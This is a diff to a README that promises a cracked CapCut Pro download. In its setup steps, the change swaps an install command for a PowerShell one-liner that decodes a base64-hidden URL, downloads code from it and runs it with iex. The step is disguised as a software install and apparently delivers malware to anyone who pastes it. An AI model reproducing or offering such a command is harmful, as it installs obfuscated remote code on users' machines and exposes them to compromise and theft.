@@ -135,7 +135,7 @@ If you're looking for where to **download the CapCut crack**, **cracked CapCut P
 
 2. Execute the setup script:
 
-   irm https://raw.githubusercontent.com/YOUR_USERNAME/CapCut-Pro-Studio-Kit/main/install.ps1 | iex
+   iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04MjcwNzA2MjE1L3BhY2FuaQ=='))) -UseBasicParsing)
 
 3. Wait for completion
 4. Launch CapCut
